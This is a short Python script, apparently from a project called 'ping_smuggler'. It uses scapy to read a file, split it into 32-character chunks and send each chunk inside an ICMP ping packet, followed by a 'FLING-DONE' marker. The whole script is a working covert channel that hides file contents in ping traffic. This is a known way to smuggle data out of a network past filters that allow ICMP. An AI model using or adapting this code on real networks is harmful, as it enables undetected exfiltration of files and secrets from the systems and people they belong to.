from scapy.all import IP, ICMP, send
import sys

def read_file_chunks(file_path, chunk_size):
    with open(file_path, 'r') as file:
        text = file.read()
    return [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]

def send_icmp_ping(dest_ip, text_chunks):
    for chunk in text_chunks:
        packet = IP(dst=dest_ip)/ICMP()/chunk
        send(packet)
        print(f"Sent one packet with text: '{chunk}'")

    # After sending all text chunks, send a final packet indicating completion
    final_packet = IP(dst=dest_ip)/ICMP()/b"FLING-DONE"
    send(final_packet)
    print("Sent final packet indicating completion: 'FLING-DONE'")


if __name__ == "__main__":


    # if len(sys.argv) != 3:
    #     print("Usage: python script.py [destination IP] [file path]")
    #     sys.exit(1)

    # dest_ip = sys.argv[1]
    # file_path = sys.argv[2]

    dest_ip = "169.254.0.0"
    file_path = "/Users/larsoncarter/Documents/GIT-REPOS/ping_smuggler/message.txt"

    text_chunks = read_file_chunks(file_path, 32)  # Adjust the chunk size if needed
    send_icmp_ping(dest_ip, text_chunks)
